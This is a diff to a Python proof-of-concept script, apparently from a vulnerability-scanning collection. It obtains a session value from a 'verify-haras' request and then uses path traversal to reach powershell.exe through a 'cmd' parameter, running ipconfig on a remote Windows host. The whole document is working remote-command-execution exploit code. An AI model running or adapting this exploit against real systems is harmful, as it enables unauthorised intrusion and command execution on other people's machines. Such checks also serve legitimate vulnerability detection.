@@ -1,4 +1,5 @@
 import requests
+import re
 
 
 # Vuln Base Info
@@ -43,11 +44,17 @@ def poc(url):
         data = """action=verify-haras"""
         headers = {}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
+        tmp = re.findall('"verify_string":"(.*)', resp0.text)
+        if tmp:
+            cid = tmp[0]
+        else:
+            result["success"] = False
+            return result
 
         path = """/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+ipconfig"""
         method = "GET"
         data = """"""
-        headers = {'Cookie': 'CID={{cid}}'}
+        headers = {'Cookie': 'CID={cid}'.format(cid=cid)}
         resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         if resp0.status_code == 200 and resp1.status_code == 200 and "verify_string" in resp0.text and "Windows IP" in resp1.text:
